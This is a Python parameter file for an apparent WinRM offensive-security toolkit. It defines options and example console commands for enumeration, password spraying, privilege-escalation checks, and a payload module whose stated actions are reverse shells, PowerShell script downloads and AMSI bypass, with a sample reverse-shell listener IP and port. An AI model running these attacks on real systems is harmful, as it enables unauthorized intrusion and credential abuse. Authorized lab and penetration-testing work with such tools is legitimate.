# scripts/winrm/shell_params.py

EXPORT_FORMATS = ["json", "html", "xml", "yaml"]

SCRIPT_PARAMS = {
    # ── enum ──────────────────────────────────────────────────────────────────
    "check": {
        "description": "Comprueba si WinRM está activo y accesible en el objetivo.",
        "required": ["target", "user"],
        "optional": ["password", "hash", "domain", "ssl", "port", "timeout"],
        "defaults": {"timeout": 5, "ssl": False},
        "mutually_exclusive": [["password", "hash"]],
        "at_least_one": [["password", "hash"]],
        "example": [
            "set target 10.10.10.5",
            "set user administrator",
            "set password Pass123!",
            "run",
        ],
    },
    "sysinfo": {
        "description": "Obtiene información del sistema via WinRM (OS, hostname, dominio, usuarios, procesos).",
        "required": ["target", "user"],
        "optional": ["password", "hash", "domain", "ssl", "port", "timeout"],
        "defaults": {"timeout": 5, "ssl": False},
        "mutually_exclusive": [["password", "hash"]],
        "at_least_one": [["password", "hash"]],
        "example": [
            "set target 10.10.10.5",
            "set user administrator",
            "set password Pass123!",
            "run",
        ],
    },
    # ── attack ────────────────────────────────────────────────────────────────
    "password-spray": {
        "description": "Password spray via WinRM contra una lista de usuarios.",
        "required": ["target", "userlist"],
        "optional": ["password", "hash", "domain", "ssl", "port", "delay", "timeout"],
        "defaults": {"timeout": 5, "ssl": False, "delay": 1},
        "mutually_exclusive": [["password", "hash"]],
        "at_least_one": [["password", "hash"]],
        "example": [
            "set target 10.10.10.5",
            "set userlist /ruta/users.txt",
            "set password Summer2024!",
            "run",
        ],
    },
    # ── exploits ──────────────────────────────────────────────────────────────
    "privesc-check": {
        "description": "Enumera vectores de escalada de privilegios via WinRM (servicios, tokens, permisos).",
        "required": ["target", "user"],
        "optional": ["password", "hash", "domain", "ssl", "port", "timeout"],
        "defaults": {"timeout": 5, "ssl": False},
        "mutually_exclusive": [["password", "hash"]],
        "at_least_one": [["password", "hash"]],
        "example": [
            "set target 10.10.10.5",
            "set user administrator",
            "set password Pass123!",
            "run",
        ],
    },
    "evil-winrm-payload": {
        "description": "Genera y lanza payloads via WinRM: reverse shell, descarga de scripts PS, bypass AMSI.",
        "required": ["target", "user", "action"],
        "optional": ["password", "hash", "domain", "ssl", "port",
                     "listener", "lport", "url", "out_dir", "timeout"],
        "defaults": {"timeout": 5, "ssl": False, "lport": 4444, "out_dir": "."},
        "mutually_exclusive": [["password", "hash"]],
        "at_least_one": [["password", "hash"]],
        "example": [
            "set target 10.10.10.5",
            "set user administrator",
            "set password Pass123!",
            "set action reverse-shell",
            "set listener 10.10.14.5",
            "set lport 4444",
            "run",
        ],
    },
}

PARAM_LABELS = {
    "target":   "IP/hostname del objetivo",
    "user":     "Usuario",
    "password": "Contraseña",
    "hash":     "Hash NT (formato NT o LM:NT)",
    "domain":   "Dominio FQDN",
    "timeout":  "Timeout de conexión (segundos)",
    "ssl":      "Usar HTTPS/SSL (True/False)",
    "port":     "Puerto WinRM (default: 5985 / 5986 con SSL)",
    "userlist": "Ruta al fichero de usuarios",
    "delay":    "Delay entre intentos de spray (segundos)",
    "action":   "Acción del payload (reverse-shell/download-script/bypass-amsi)",
    "listener": "IP del listener para reverse shell",
    "lport":    "Puerto del listener",
    "url":      "URL del script PS a descargar",
    "out_dir":  "Directorio de salida para artefactos",
}
